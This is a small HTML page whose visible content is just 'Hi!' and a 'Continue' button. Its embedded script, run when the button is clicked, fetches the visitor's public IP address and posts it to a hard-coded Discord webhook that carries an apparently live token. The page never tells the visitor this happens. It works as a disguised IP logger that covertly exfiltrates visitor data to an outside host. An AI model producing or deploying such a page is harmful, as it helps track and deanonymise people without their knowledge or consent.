<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Message to Discord Webhook</title>
  <script>
    function sendMessageToWebhook() {
      // Fetch the user's IP address from an external API
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const userIP = data.ip;
          const message = `The WiFi IPv4: ${userIP}`;

          const webhookUrl = 'https://discord.com/api/webhooks/1368152490910023740/DyLyeEic8T66YhblKB13Ecf9KCgDpyfQ5DaA6qQdwmPSsw3GjcVif-RRRAwnr_SmzLWU';
          const payload = {
            content: message,  // Send the message with the user's IP address
            username: "Webhook Bot",
            avatar_url: "https://i.imgur.com/4M34hi2.png"  // optional
          };

          // Send the POST request to the webhook
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          })
          .then(response => {
            if (response.ok) {
              alert("Message sent successfully!");
            } else {
              alert("Failed to send message.");
            }
          })
          .catch(error => {
            console.error("Error sending message:", error);
            alert("Error sending message.");
          });
        })
        .catch(error => {
          console.error("Error fetching IP address:", error);
          alert("Error fetching IP address.");
        });
    }
  </script>
</head>
<body>
  <h1>Hi!</h1>
  <button onclick="sendMessageToWebhook()">Continue</button>
</body>
</html>
